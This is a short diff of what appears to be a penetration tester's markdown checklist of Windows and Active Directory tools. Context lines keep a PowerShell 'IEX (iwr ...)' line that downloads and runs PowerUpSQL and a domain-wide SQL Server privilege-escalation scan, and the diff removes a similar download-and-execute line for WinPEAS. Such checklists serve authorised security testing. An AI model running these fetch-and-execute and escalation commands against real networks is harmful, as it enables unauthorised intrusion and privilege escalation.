@@ -41,11 +41,6 @@ IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"} | Get-SQLServerPrivEscRowThreated | Out-File "$env:USERPROFILE\Downloads\fkad\mssql_priv.txt"
 ```
 - [ ] Seatbelt
-- [ ] WinPEAS
-```powershell
-IEX (iwr 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
-```
-- [ ] msicrab
 - [ ] Snaffler
 - [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
 ```powershell
